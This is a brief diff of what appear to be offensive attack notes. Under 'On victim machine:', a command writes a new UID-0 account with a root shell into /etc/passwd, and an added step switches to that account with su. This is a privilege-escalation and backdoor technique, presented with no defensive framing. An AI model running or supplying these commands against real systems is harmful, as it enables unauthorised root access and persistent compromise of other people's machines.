@@ -17,3 +17,6 @@ On victim machine:
 ```bash
 echo "$(NEW_USER):$(OPENSSL_OUTPUT):0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
+```bash
+su $(NEW_USER)
+```
